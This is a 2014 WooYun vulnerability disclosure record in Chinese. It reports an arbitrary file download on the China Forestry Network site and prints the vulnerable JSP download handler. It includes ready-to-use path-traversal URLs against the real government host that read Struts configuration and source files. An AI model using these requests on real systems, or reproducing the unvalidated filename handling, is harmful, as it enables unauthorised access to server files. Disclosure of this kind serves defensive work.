{"id": 54283, "wybug_id": "wooyun-2014-064958", "wybug_title": "中国林业网主站任意文件下载", "wybug_corp": "中国林业网", "wybug_author": "nextdoor", "wybug_date": "2014-06-16 19:09", "wybug_open_date": "2014-06-21 19:10", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 任意文件下载 详细说明：  漏洞网站http://www.forestry.gov.cn/下载链接\nhttp://www.forestry.gov.cn/DownloadFile.jsp?filename=../WEB-INF/struts/struts-config.xmlhttp://www.forestry.gov.cn/DownloadFile.jsp?filename=../DownloadFile.jsp\n   漏洞证明：  漏洞文件分析\n<%@page language=\"java\" contentType=\"application/x-msdownload\" import=\"java.io.*,java.net.*\" pageEncoding=\"gb2312\"%><%@ page import=\"com.futuresoftware.ccmbam.setting.AppConfig\"%><%     //关于文件下载时采用文件流输出的方式处理：    //加上response.reset()，并且所有的％>后面不要换行，包括最后一个；    //因为Application Server在处理编译jsp时对于％>和<％之间的内容一般是原样输出，而且默认是PrintWriter，    //而你却要进行流输出：ServletOutputStream，这样做相当于试图在Servlet中使用两种输出机制，    //就会发生：getOutputStream() has already been called for this response的错误    //详细请见《More Java Pitfill》一书的第二部分 Web层Item 33：试图在Servlet中使用两种输出机制 270    //而且如果有换行，对于文本文件没有什么问题，但是对于其它格式，比如AutoCAD、Word、Excel.Sql等文件    //下载下来的文件中就会多出一些换行符0x0d和0x0a，这样可能导致某些格式的文件无法打开，有些也可以正常打开。    response.reset();//可以加也可以不加    response.setContentType(\"application/x-download\");//设置为下载application/x-download    // /../../退WEB-INF/classes两级到应用的根目录下去，注意Tomcat与WebLogic下面这一句得到的路径不同，WebLogic中路径最后没有/        String filename=request.getParameter(\"filename\"); //得到下载的文件名    String filenamedownload =AppConfig.WebServer_dir + \"/DB/\"+filename; //下载的地址        System.out.println(filenamedownload);    String filenamedisplay =filename;//系统解决方案     filenamedisplay = URLEncoder.encode(filenamedisplay,\"UTF-8\");    response.addHeader(\"Content-Disposition\",\"attachment;filename=\" + filenamedisplay);    OutputStream output = null;    FileInputStream fis = null;    try    {        output  = response.getOutputStream();        fis = new FileInputStream(filenamedownload); //未过滤下载        byte[] b = new byte[1024];        int i = 0;        while((i = fis.read(b)) > 0)        {            output.write(b, 0, i);        }        output.flush();    }    catch(Exception e)    {        System.out.println(\"Error!\");        e.printStackTrace();    }    finally    {        if(fis != null)        {            fis.close();            fis = null;        }        if(output != null)        {            output.close();            output = null;        }    }%>\n   修复方案：  漏洞见上一个漏洞修复    版权声明：转载请注明来源 nextdoor@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-21 19:10 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}